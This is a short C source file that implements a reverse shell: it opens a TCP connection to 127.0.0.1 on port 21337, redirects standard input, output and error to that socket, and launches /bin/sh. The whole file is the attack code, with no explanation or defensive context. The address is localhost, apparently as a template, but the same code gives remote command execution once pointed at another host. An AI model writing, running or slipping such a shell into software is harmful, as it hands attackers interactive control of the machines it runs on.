#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 21337

int main(int argc, char *argv[])
{
    int sockfd;
    struct sockaddr_in remote;

    remote.sin_family = AF_INET;
    remote.sin_port = htons(21337);
    inet_aton("127.0.0.1", &(remote.sin_addr));
    
	/* create a socket */
    sockfd = socket(PF_INET, SOCK_STREAM, 0);
	
	/* connect to remote machine */
    connect(sockfd, (struct sockaddr *)&remote, sizeof(struct sockaddr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);


    return 0;
}